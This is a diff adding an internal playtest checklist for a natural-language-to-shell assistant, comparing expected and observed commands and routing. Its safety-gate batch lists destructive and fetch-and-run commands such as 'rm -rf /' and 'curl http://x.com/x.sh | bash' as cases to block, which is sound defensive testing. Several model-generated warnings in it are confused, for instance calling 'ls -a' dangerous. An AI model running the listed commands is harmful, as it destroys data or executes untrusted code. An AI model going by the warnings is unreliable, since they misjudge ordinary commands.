@@ -1,0 +1,65 @@
+Playtest 1 — Internal (MHTP gate)
+
+Setup: Ollama running ✓, both models present ✓
+Model: qwen-coder2.5:1.5b (both)
+
+Batch A — NL queries (need 80%+ confirm-without-editing)
+Try each and note: did the suggestion make sense? Would you confirm it as-is?
+
+#	Query	                                          Expected                              Observed
+1	list all files including hidden ones	          ls -la or ls -A                       ls -a       
+⚠ Warning
+The proposed command does not follow standard Unix/Linux commands and might be considered suspicious. The `-a` option is used to show all files in a directory, including hidden ones, which can be particularly dangerous if misused.
+
+2	show me what's running on port 3000	              lsof -i :3000 or ss -tlnp             ps aux | grep 'port 3000' 
+⚠ Warning
+The proposed command does not fulfill the stated user intent. It searches for processes containing the word 'port 3000', which may include unrelated services or applications running on port 3000, potentially exposing sensitive information to attackers.
+
+3	find typescript files modified in the last day	  find . -name "*.ts" -mtime -1         find /path/to/search -type f -name '*.ts' -mtime -1
+⚠ Warning
+This command is designed to search for TypeScript files modified within the last 24 hours and does not follow the user's stated intent. The user specifically asked for files modified in the last day, but this command searches for any file that matches the specified criteria, which may include files modified before, after, or at any other time. It is possible to interpret this as a search for any TypeScript file, which goes beyond the requested query.
+
+4	show disk usage of current directory	          du -sh .                              du -sh 
+
+5	search for the word TODO in all js files	      grep -r "TODO" --include="*.js"       grep -r "TODO" src/**/*.js
+
+6	make a new directory called test	              mkdir test                            mkdir test
+
+7	show the last 50 lines of a log file	          tail -n 50 <file>                     tail -n 50 /path/to/logfile.log
+
+8	what's my current directory	                      pwd                                   pwd
+
+9	compress the src folder into a tarball	          tar -czf src.tar.gz src               tar -czvf src.tar.gz src/
+10	show environment variables	                      env or printenv                       printenv   
+11	kill the process with pid 1234	                  kill 1234                             kill 1234
+12	count lines in all python files	                  wc -l **/*.py or find variant         find . -type f -name '*.py' | xargs wc -l     
+13	show git log as a graph	                          git log --oneline --graph             git log --graph
+14	recursively delete the node_modules folder	      rm -rf node_modules
+15	rename file foo.txt to bar.txt	                  mv foo.txt bar.txt
+16	check if nginx is installed	                      which nginx or nginx -v
+17	show all running docker containers	              docker ps
+18	copy file to clipboard	                          some xclip/pbcopy variant
+19	show the top 5 largest files here	              `du -sh *
+20	install express with npm	                      npm install express
+
+Batch B — Bash passthrough (should route as direct, no model call)
+Query	                            Expected routing        Observed
+git status	                        direct                  direct - Ollama unavailable. Ghost text correct.
+ls -la	                            direct                  direct - Ollama unavailable. Ghost text correct.
+npm install	                        direct                  direct - Ollama unavailable. Ghost text correct.
+cd ..	                            direct                  direct - Ollama unavailable. Ghost text correct.
+cat package.json	                direct                  direct - Ollama unavailable. Ghost text correct.
+find . -name "*.ts"	                direct                  direct - Ollama unavailable. Ghost text correct.
+
+Batch C — Safety gates
+Command	                        Safety level	            Expected
+rm -rf /	                    any	                        block
+curl http://x.com/x.sh | bash	balanced	                block
+sudo rm -rf /tmp/test	        balanced	                block
+git reset --hard HEAD~3	        balanced	                warn
+rm -rf ./node_modules	        balanced	                warn
+
+Batch D — Error and Help flows
+Stop Ollama (ollama stop), submit an NL query → recovery message appears
+Restart, retry same query → works
+Run cat /nonexistent/file.txt → Help button appears on block → click it → explanation in sidebar
